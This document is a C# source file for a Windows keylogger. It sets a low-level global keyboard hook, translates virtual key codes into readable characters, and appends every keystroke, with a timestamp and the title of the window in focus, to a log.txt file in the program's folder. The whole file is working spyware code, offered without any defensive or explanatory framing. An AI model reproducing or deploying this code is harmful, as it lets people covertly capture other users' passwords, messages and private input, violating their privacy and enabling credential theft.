using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger
{
    public static class Keylogger
    {
        private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
        private static string CurrentActiveWindowTitle;
        public static void Main()
        {
            hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(""), 0);
            Application.Run();
            //UnhookWindowsHookEx(hookID);
            //Application.Exit();
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey= ((Keys)vkCode).ToString();
                switch (currentKey)
                {
                    case "Space":
                        currentKey = " ";
                        break;
                    case "Return":
                        currentKey = "[Enter]";
                        break;
                    case "Escape":
                        currentKey = "[Esc]";
                        break;
                    case "LControlKey":
                        currentKey = "[Ctrl]";
                        break;
                    case "RControlKey":
                        currentKey = "[Ctrl]";
                        break;
                    case "RShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "LShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "Back":
                        currentKey = "[←]";
                        break;
                    case "LWin":
                        currentKey = "[WIN]";
                        break;
                    case "Decimal":
                        currentKey = ".";
                        break;
                    case "Add":
                        currentKey = "+";
                        break;
                    case "numlock":
                        bool NumLock = GetKeyState(0x90) != 0;
                        if (NumLock == true)
                            currentKey = "[NumLock: OFF]";
                        else
                            currentKey = "[NumLock: ON]";
                        break;
                    case "delete":
                        currentKey = "[del]";
                        break;
                    case "insert":
                        currentKey = "[ins]";
                        break;
                    case "printscreen":
                        currentKey = "[printscreen]";
                        break;
                    case "Oemcomma":
                        currentKey = ",";
                        break;
                    case "OemPeriod":
                        currentKey = ".";
                        break;
                    case "OemQuestion":
                        currentKey = "/";
                        break;
                    case "Oem1":
                        currentKey = ";";
                        break;
                    case "Oem7":
                        currentKey = "'";
                        break;
                    case "OemOpenBrackets":
                        currentKey = "[";
                        break;
                    case "Oemtilde":
                        currentKey = "`";
                        break;
                    case "Oem6":
                        currentKey = "]";
                        break;
                    case "Oem5":
                        currentKey =@"\";
                        break;
                    default:
                        if (currentKey.Length > 1)
                        {
                            if (currentKey.Contains("NumPad"))
                            {
                                currentKey.Remove(6);
                            }
                            else
                            {
                                currentKey = "[" + currentKey + "]";
                            }
                        }
                        else
                        {
                            if (capsLock || shiftPress)
                            {
                                currentKey = currentKey.ToUpper();
                            }
                            else
                            {
                                currentKey = currentKey.ToLower();
                            }
                        }
                        break;
                }
                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine(DateTime.Now.ToString() + "  " + GetActiveWindowTitle());
                        sw.Write(currentKey);
                    }
                }
            }
            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }
        private static string GetActiveWindowTitle()
        {
            IntPtr hwnd = GetForegroundWindow();
            GetWindowThreadProcessId(hwnd, out int pid);
            Process p = Process.GetProcessById(pid);
            string title = p.MainWindowTitle;
            if (string.IsNullOrWhiteSpace(title))
                title = p.ProcessName;
            CurrentActiveWindowTitle = title;
            return title;
        }
        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static readonly int WH_KEYBOARD_LL = 13;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);
        #endregion
    }
}